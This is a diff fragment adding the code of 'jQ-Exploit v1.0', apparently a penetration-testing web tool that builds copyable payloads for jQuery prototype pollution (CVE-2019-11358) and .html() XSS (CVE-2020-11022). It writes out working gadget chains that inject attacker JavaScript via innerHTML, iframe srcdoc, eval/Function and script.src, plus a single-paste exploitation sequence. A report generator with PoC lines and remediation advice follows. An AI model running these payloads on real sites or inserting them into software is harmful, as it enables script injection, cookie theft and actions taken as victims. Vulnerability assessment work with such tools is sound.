+$('<div>').appendTo('body').append('<style><style/><img src=x onerror="${escapeForCode(callback)}">');
+
+// Alternative trigger patterns:
+// $('body').prepend(...)
+// $('body').after(...)
+// $('body').before(...)
+// $('body').replaceWith(...)`,
+      impact: 'Same root cause as .html() — any jQuery DOM insertion method is affected.'
+    });
+  }
+
+  if (categories.innerhtml) {
+    state.xssChains.push({
+      title: 'PP → innerHTML gadget chain',
+      severity: 'high',
+      code: `// Step 1: Pollute innerHTML property
+$.extend(true, {}, JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=\\'${escapeForCode(callback)}\\'>"}}'));
+
+// Step 2: If any page JS does something like:
+//   element.innerHTML = config.innerHTML || defaults.innerHTML
+//   or: el.innerHTML = obj.content  (where obj.content is undefined)
+// The polluted value fires.
+
+// Manual trigger to prove it works:
+var testDiv = document.createElement('div');
+var emptyObj = {};
+testDiv.innerHTML = emptyObj.innerHTML;  // reads from polluted prototype
+document.body.appendChild(testDiv);
+
+// Cleanup
+delete Object.prototype.innerHTML;`,
+      impact: 'Chains PP into DOM XSS via innerHTML. Requires any code path that reads innerHTML/content from an unpopulated object.'
+    });
+  }
+
+  if (categories.srcdoc) {
+    state.xssChains.push({
+      title: 'PP → srcdoc iframe injection',
+      severity: 'high',
+      code: `// Pollute srcdoc — targets dynamically created iframes
+$.extend(true, {}, JSON.parse('{"__proto__":{"srcdoc":"<script>${escapeForCode(callback)}<\\/script>"}}'));
+
+// If any code creates an iframe and reads config.srcdoc:
+var testFrame = document.createElement('iframe');
+var config = {};
+if (config.srcdoc) {
+  testFrame.srcdoc = config.srcdoc;  // Reads from polluted prototype
+  document.body.appendChild(testFrame);
+}
+
+console.log("[*] srcdoc polluted:", {}.srcdoc);
+delete Object.prototype.srcdoc;`,
+      impact: 'Creates a sandboxed XSS context via iframe srcdoc injection.'
+    });
+  }
+
+  if (categories.evalGadget) {
+    state.xssChains.push({
+      title: 'PP → eval() / Function() gadget',
+      severity: 'critical',
+      code: `// Pollute properties commonly passed to eval() or new Function()
+$.extend(true, {}, JSON.parse('{"__proto__":{"source":"${escapeForCode(callback)}","code":"${escapeForCode(callback)}","expression":"${escapeForCode(callback)}"}}'));
+
+// Targets patterns like:
+//   eval(config.source)
+//   new Function(settings.code)()
+//   eval(options.expression)
+
+console.log("[*] eval gadget properties planted:");
+console.log("    .source:", {}.source);
+console.log("    .code:", {}.code);
+console.log("    .expression:", {}.expression);
+
+delete Object.prototype.source;
+delete Object.prototype.code;
+delete Object.prototype.expression;`,
+      impact: 'If any code evals a property from an unpopulated object, full XSS is achieved.'
+    });
+  }
+
+  if (categories.scriptSrc) {
+    state.xssChains.push({
+      title: 'PP → dynamic script.src injection',
+      severity: 'critical',
+      code: `// Pollute 'src' for dynamically created script elements
+$.extend(true, {}, JSON.parse('{"__proto__":{"src":"data:text/javascript,${encodeURIComponent(callback)}"}}'));
+
+// Targets patterns like:
+//   var s = document.createElement('script');
+//   s.src = config.scriptUrl || defaults.src;
+//   ^^^^ if config.scriptUrl is undefined, falls to prototype
+
+// Also pollute 'href' for link/a elements:
+// $.extend(true, {}, JSON.parse('{"__proto__":{"href":"javascript:${escapeForCode(callback)}"}}'));
+
+console.log("[*] script.src gadget:", {}.src);
+delete Object.prototype.src;`,
+      impact: 'Hijacks dynamic script loading to execute attacker-controlled JavaScript.'
+    });
+  }
+
+  // ALL-IN-ONE
+  state.xssChains.push({
+    title: 'ALL-IN-ONE: Full exploitation sequence',
+    severity: 'critical',
+    code: `// ==========================================
+// jQ-Exploit: Full Exploitation Sequence
+// Target: jQuery ${state.version || '<3.5.0'}
+// ==========================================
+
+(function() {
+  var results = [];
+  var CB = '${escapeForCode(callback)}';
+
+  // 1. Confirm jQuery
+  if (typeof jQuery === 'undefined') {
+    console.log('[-] No jQuery found. Aborting.');
+    return;
+  }
+  console.log('[+] jQuery ' + jQuery.fn.jquery + ' detected');
+
+  // 2. Test Prototype Pollution
+  $.extend(true, {}, JSON.parse('{"__proto__":{"_jqe_pp_test":"confirmed"}}'));
+  if ({}._jqe_pp_test === 'confirmed') {
+    results.push('PP: VULNERABLE');
+    console.log('%c[!] Prototype Pollution CONFIRMED', 'color:red;font-weight:bold');
+    delete Object.prototype._jqe_pp_test;
+  } else {
+    results.push('PP: NOT VULNERABLE');
+    console.log('[-] PP not exploitable');
+  }
+
+  // 3. Test .html() XSS (CVE-2020-11022)
+  try {
+    var testDiv = document.createElement('div');
+    testDiv.id = '_jqe_xss_test';
+    testDiv.style.display = 'none';
+    document.body.appendChild(testDiv);
+    jQuery('#_jqe_xss_test').html('<style><style/><img src=x onerror="window._jqe_xss_fired=true">');
+    setTimeout(function() {
+      if (window._jqe_xss_fired) {
+        results.push('HTML XSS: VULNERABLE');
+        console.log('%c[!] .html() XSS CONFIRMED (CVE-2020-11022)', 'color:red;font-weight:bold');
+      } else {
+        results.push('HTML XSS: Not triggered');
+      }
+      delete window._jqe_xss_fired;
+      document.getElementById('_jqe_xss_test').remove();
+
+      // 4. Summary
+      console.log('\\n===== jQ-Exploit Results =====');
+      results.forEach(function(r) { console.log('[*] ' + r); });
+      console.log('==============================');
+    }, 500);
+  } catch(e) {
+    console.log('[-] XSS test error:', e);
+  }
+})();`,
+    impact: 'Single-paste comprehensive test. Confirms PP, tests HTML XSS, and prints a summary. Safe — cleans up after itself.'
+  });
+
+  // Render
+  const html = state.xssChains.map((p, i) => `
+    <div class="result-card vuln">
+      <h4>
+        <span class="severity ${p.severity}">${p.severity.toUpperCase()}</span>
+        ${p.title}
+      </h4>
+      <p>${p.impact}</p>
+      <pre><button class="copy-btn" onclick="copyText(\`${escapeForTemplate(p.code)}\`)">Copy</button>${escapeHtml(p.code)}</pre>
+    </div>
+  `).join('');
+
+  container.innerHTML = html;
+}
+
+// ===== REPORT GENERATOR =====
+function generateReport() {
+  const engId = document.getElementById('engagementId').value.trim() || 'N/A';
+  const notes = document.getElementById('reportNotes').value.trim();
+  const version = state.version || document.getElementById('jqVersion').value.trim();
+  const url = state.url || document.getElementById('targetUrl').value.trim();
+  const now = new Date().toISOString().split('T')[0];
+
+  const lines = [
+    { text: `╔══════════════════════════════════════════════════════════════╗`, cls: 'error' },
+    { text: `║  VULNERABILITY REPORT — jQuery Prototype Pollution & XSS   ║`, cls: 'error' },
+    { text: `╚══════════════════════════════════════════════════════════════╝`, cls: 'error' },
+    { text: ``, cls: '' },
+    { text: `Date:           ${now}`, cls: 'info' },
+    { text: `Engagement:     ${engId}`, cls: 'info' },
+    { text: `Target URL:     ${url || 'N/A'}`, cls: 'info' },
+    { text: `jQuery Version: ${version}`, cls: 'info' },
+    { text: ``, cls: '' },
+    { text: `═══ FINDINGS SUMMARY ═══`, cls: 'warn' },
+    { text: ``, cls: '' },
+  ];
+
+  if (state.cves.length === 0) {
+    // Run detection if not done yet
+    for (const [cveId, cve] of Object.entries(CVE_DB)) {
+      if (cve.check(version)) {
+        state.cves.push({ id: cveId, ...cve });
+      }
+    }
+  }
+
+  state.cves.forEach((cve, i) => {
+    lines.push({ text: `Finding ${i+1}: ${cve.id} — ${cve.title}`, cls: 'error' });
+    lines.push({ text: `  Severity:     ${cve.severity} (CVSS ${cve.cvss})`, cls: 'warn' });
+    lines.push({ text: `  Affected:     jQuery ${cve.affected}`, cls: 'dim' });
+    lines.push({ text: `  Description:  ${cve.description}`, cls: '' });
+    lines.push({ text: `  Reference:    ${cve.references[0]}`, cls: 'dim' });
+    lines.push({ text: ``, cls: '' });
+  });
+
+  lines.push({ text: `═══ EXPLOITATION EVIDENCE ═══`, cls: 'warn' });
+  lines.push({ text: ``, cls: '' });
+  lines.push({ text: `Prototype Pollution PoC (browser console):`, cls: 'info' });
+  lines.push({ text: `  $.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"pwned"}}'));`, cls: 'success' });
+  lines.push({ text: `  console.log({}.polluted); // → "pwned"`, cls: 'success' });
+  lines.push({ text: ``, cls: '' });
+  lines.push({ text: `XSS PoC (browser console):`, cls: 'info' });
+  lines.push({ text: `  $('<div>').html('<style><style/><img src=x onerror=alert(document.domain)>');`, cls: 'success' });
+  lines.push({ text: ``, cls: '' });
+  lines.push({ text: `═══ IMPACT ASSESSMENT ═══`, cls: 'warn' });
+  lines.push({ text: ``, cls: '' });
+  lines.push({ text: `Prototype Pollution (CVE-2019-11358):`, cls: 'info' });
+  lines.push({ text: `  - Allows modification of Object.prototype affecting all JS objects`, cls: '' });
+  lines.push({ text: `  - Can chain into XSS if exploitable gadgets exist on the page`, cls: '' });
+  lines.push({ text: `  - Can tamper with application logic via polluted default values`, cls: '' });
+  lines.push({ text: `  - Severity increases significantly if combined with other libraries`, cls: '' });
+  lines.push({ text: ``, cls: '' });
+  lines.push({ text: `HTML Parsing XSS (CVE-2020-11022/11023):`, cls: 'info' });
+  lines.push({ text: `  - Direct XSS if user-controlled input reaches .html()/.append()`, cls: '' });
+  lines.push({ text: `  - Can steal session cookies, tokens, and user data`, cls: '' });
+  lines.push({ text: `  - Can perform actions as the victim user`, cls: '' });
+  lines.push({ text: ``, cls: '' });
+  lines.push({ text: `═══ REMEDIATION ═══`, cls: 'warn' });
+  lines.push({ text: ``, cls: '' });
+  lines.push({ text: `1. Upgrade jQuery to version 3.5.0 or later (current: 3.7.1)`, cls: 'success' });
+  lines.push({ text: `2. If upgrade is not immediately possible, apply the jQuery Migrate plugin`, cls: '' });
+  lines.push({ text: `3. Sanitize all user input before passing to jQuery DOM methods`, cls: '' });
+  lines.push({ text: `4. Use Object.freeze(Object.prototype) as a defense-in-depth measure`, cls: '' });
+  lines.push({ text: `5. Implement Content-Security-Policy headers to mitigate XSS impact`, cls: '' });
+
+  if (notes) {
+    lines.push({ text: ``, cls: '' });
+    lines.push({ text: `═══ ADDITIONAL NOTES ═══`, cls: 'warn' });
+    lines.push({ text: `${notes}`, cls: '' });
+  }
+
+  lines.push({ text: ``, cls: '' });
+  lines.push({ text: `═══ END OF REPORT ═══`, cls: 'dim' });
+  lines.push({ text: `Generated by jQ-Exploit v1.0`, cls: 'dim' });
+
+  logTo('report-output', lines);
+}
+
+// ===== HELPERS =====
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function escapeForCode(str) {
+  return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
+}
+
+function escapeForTemplate(str) {
+  return str.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
+}
+
+// Auto-run detection on load
+window.addEventListener('DOMContentLoaded', () => {
+  runDetection();
+});
+</script>
+</body>
+</html>
